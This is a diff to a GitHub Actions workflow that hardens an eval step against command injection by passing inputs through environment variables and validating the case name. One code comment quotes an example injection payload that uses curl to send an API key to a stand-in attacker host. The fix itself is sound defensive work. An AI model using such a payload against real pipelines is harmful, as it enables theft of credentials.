@@ -44,15 +44,26 @@ jobs:
 
       - name: Run eval
         id: eval
+        env:
+          # Pass workflow_dispatch inputs via env vars so they never enter the
+          # shell script via ${{ }} interpolation — that's a command-injection
+          # vector (`"; curl attacker.com/exfil?key=$DEEPSEEK_API_KEY #`).
+          EVAL_CASE: ${{ inputs.case }}
+          EVAL_REFRESH_SNAPSHOTS: ${{ inputs.refresh_snapshots }}
         run: |
-          ARGS=""
-          if [ -n "${{ inputs.case }}" ]; then
-            ARGS="$ARGS --case ${{ inputs.case }}"
+          ARGS=()
+          if [ -n "$EVAL_CASE" ]; then
+            # Validate: case names are always [a-z0-9-]+ in golden-queries.json.
+            if ! printf '%s' "$EVAL_CASE" | grep -Eq '^[a-z0-9-]+$'; then
+              echo "::error::Invalid case name: must match ^[a-z0-9-]+$"
+              exit 2
+            fi
+            ARGS+=(--case "$EVAL_CASE")
           fi
-          if [ "${{ inputs.refresh_snapshots }}" = "true" ]; then
-            ARGS="$ARGS --refresh-snapshots"
+          if [ "$EVAL_REFRESH_SNAPSHOTS" = "true" ]; then
+            ARGS+=(--refresh-snapshots)
           fi
-          npm run eval -- $ARGS > eval-report.json
+          npm run eval -- "${ARGS[@]}" > eval-report.json
         continue-on-error: true
 
       - name: Upload report
